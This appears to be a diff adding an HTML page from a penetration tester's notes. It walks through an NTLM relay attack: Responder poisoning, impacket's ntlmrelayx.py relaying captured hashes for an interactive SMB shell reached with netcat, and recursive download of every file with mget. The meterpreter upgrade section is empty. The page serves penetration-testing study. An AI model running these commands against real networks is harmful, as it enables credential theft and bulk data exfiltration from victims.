@@ -1,0 +1,84 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Responder and Ntlmrelayx --> SMB shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Responder and Ntlmrelayx --> SMB shell</h1><br /><br /><strong>1. Disable SMB and HTTP on the
+      Responder</strong><br />We need to disable SMB and HTTP in Responder.conf because MultiRelay need to use ports
+    80/tcp and 445/tcp<br /> To check their status:<br />
+    <div class="codebox">
+      <div class="codebox">responder&nbsp;-I&nbsp;eth0&nbsp;-rv</div>
+    </div><br /> -r → will make Responder reply to NetBIOS workstation/redirect requests<br /> -v → verbose to show more
+    output<br /> <a href=""><img src="images/1251-1.png" alt="images/1251-1.png" /></a><br /> <br /> To edit their value
+    to Off:<br />
+    <div class="codebox">
+      <div class="codebox">nano&nbsp;/etc/responder/Responder.conf</div>
+    </div><br /> <a href=""><img src="images/1251-2.png" alt="images/1251-2.png" /></a><br /><br /><strong>2. Start the
+      Responder </strong><br /> ◇ If we want use <a
+      href="Sign-On(SSO)_implementation_of_Windows_in_order_to_capture_NTLM_hashes--Capture_the_Hahes_redirect_to_Attacker's_SMB_share_using_UNC_path.html">UNC
+      paths</a><br />
+    <div class="codebox">
+      <div class="codebox">root@kali:~#&nbsp;responder&nbsp;-I&nbsp;eth0</div>
+    </div><br /> use also the option --lm if we want conduct an NTLM downgrade attack<br /> ◇ If we want to wait for <a
+      href="e_Sign-On(SSO)_implementation_of_Windows_in_order_to_capture_NTLM_hashes--LLMNR_&_NetBIOS_NS_Spoofing-Poisoning_(mispelled_share_queries).html">misspelled
+      share queries (LLMNR &amp; NetBIOS NS Spoofing/Poisoning)</a><br />
+    <div class="codebox">
+      <div class="codebox">root@kali:~#&nbsp;responder&nbsp;-I&nbsp;eth0&nbsp;-rdwv</div>
+    </div><br /> <a href=""><img src="images/1251-3.png" alt="images/1251-3.png" /></a><br /> use also the option --lm
+    if we want conduct an NTLM downgrade attack<br /><br /><strong>3. Start ntlmrelay.py</strong><br />ntlmrelay is the
+    updated version of <a
+      href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py" target="_blank">smbrelay</a><br />If the hash
+    obtained in the chapters<br /> ◇ <a
+      href="Sign-On(SSO)_implementation_of_Windows_in_order_to_capture_NTLM_hashes--Capture_the_Hahes_redirect_to_Attacker's_SMB_share_using_UNC_path.html">redirect
+      to Attacker&#39;s SMB share using UNC path to steal NTLM credential</a><br /> ◇ <a
+      href="e_Sign-On(SSO)_implementation_of_Windows_in_order_to_capture_NTLM_hashes--LLMNR_&_NetBIOS_NS_Spoofing-Poisoning_(mispelled_share_queries).html">LLMNR
+      &amp; NetBIOS NS Spoofing/Poisoning for capture NTLM hashes (misspelled share queries)</a><br />are to hard to
+    crack, we can relaying them by using ntlrelayx.py<br />Now we can launch ntlrelayx.py<br /><br /> ◇ If we want
+    capture the hashes<br />
+    <div class="codebox">
+      <div class="codebox">
+        kali@kali:~$&nbsp;cd&nbsp;/usr/share/doc/python3-impacket/examples/<br />kali@kali:~$&nbsp;python3&nbsp;ntlmrelayx.py&nbsp;-t&nbsp;[IPtarget]&nbsp;-smb2support
+      </div>
+    </div><br /> <a href=""><img src="images/1251-4.png" alt="images/1251-4.png" /></a><br /> we can use the hashes with
+    <a
+      href="ethodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Windows_Privilege_Escalation--4._Passwords--Pass_the_Hashes--psexec.html">psexec</a><br />
+    ◇ <span style="text-decoration:underline;">If we want start an interactive shell on
+      127.0.0.1(localhost)</span><br />
+    <div class="codebox">
+      <div class="codebox">
+        kali@kali:~$&nbsp;cd&nbsp;/usr/share/doc/python3-impacket/examples/<br />kali@kali:~$&nbsp;python3&nbsp;ntlmrelayx.py&nbsp;-t&nbsp;[IPtarget]&nbsp;-smb2support&nbsp;-i
+      </div>
+    </div><br /> <a href=""><img src="images/1251-5.png" alt="images/1251-5.png" /></a><br /> connect to the <span
+      style="text-decoration:underline;">SMB shell</span> with netcat <br />
+    <div class="codebox">
+      <div class="codebox">kali@kali:~$&nbsp;nc&nbsp;127.0.0.1&nbsp;11000</div>
+    </div><br /> <a href=""><img src="images/1251-6.png" alt="images/1251-6.png" /></a><br />OPTIONS
+    ntlmrelayx.py:<br /> ◇ -t &lt;IPtarget&gt;, --target &lt;IPtarget&gt; → target to relay the credentials to, can be
+    an IP, hostname or URL like domain\username@host:port (domain\username and port are optional).<br /> ◇ -smb2support
+    → SMB2 Support (experimental!)<br /> ◇ -i, --interactive → interactive console will be launched on
+    127.0.0.1:[port]<br /> <br /><strong>
+      <h3>4. SMB Shell</h3>
+    </strong><br /> Download all the files listed in the actual folder, preserving the structure of the directories
+    inside<br />
+    <div class="codebox">
+      <div class="codebox">
+        smb&gt;&nbsp;cd&nbsp;&lt;folder&gt;<br />smb&gt;&nbsp;ls<br />smb&gt;&nbsp;recurse&nbsp;ON<br />smb&gt;&nbsp;prompt&nbsp;OFF<br />smb&gt;&nbsp;mget&nbsp;*
+      </div>
+    </div><br /> We can use a tool like tree to see the structures of the folders<br />
+    <div class="codebox">
+      <div class="codebox">root@kali:/#&nbsp;tree</div>
+    </div><br /> <a href=""><img src="images/1251-7.png" alt="images/1251-7.png" /></a><br /><br /><strong>
+      <h3>5. Upgrade the SMB shell to meterpreter</h3>
+    </strong><br /> <br /> <br /> <br /><br /><strong>bibliography:</strong><br /><a
+      href="https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/" target="_blank">https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/</a><br />
+  </div>
+</body>
+
+</html>
